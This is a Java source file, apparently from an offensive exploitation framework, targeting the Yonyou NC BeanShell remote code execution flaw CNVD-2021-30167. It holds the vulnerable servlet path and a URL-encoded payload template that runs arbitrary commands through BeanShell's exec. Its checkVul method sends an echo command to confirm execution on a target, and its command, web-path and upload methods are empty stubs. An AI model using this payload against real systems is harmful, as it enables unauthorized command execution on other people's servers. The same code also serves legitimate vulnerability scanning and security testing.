package fun.fireline.exp.cms.nc;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.util.UUID;

/**
 * @author yhy
 * @date 2021/7/5 20:03
 * @github https://github.com/yhy0
 */
// 用友NC BeanShell 远程代码执行漏洞
public class CNVD_2021_30167 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private static final String VULURL = "/servlet/~ic/bsh.servlet.BshServlet";
    private static final String PAYLOAD = "bsh.script=exec%28%22%s%22%29%3B%0D%0A";

    @Override
    public boolean checkVul(String url) {

        String uuid =  UUID.randomUUID().toString();

        this.target = url + VULURL;
        try {
            String data = String.format(PAYLOAD, "echo " + uuid);
            String result = HttpTool.postHttpReuest(this.target,"application/x-www-form-urlencoded", data, "UTF-8");
            boolean flag = result.contains(uuid);

            if(flag) {
                this.isVul = true;
            }
            return flag;
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        return null;
    }

    @Override
    public String getWebPath() {
        return null;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
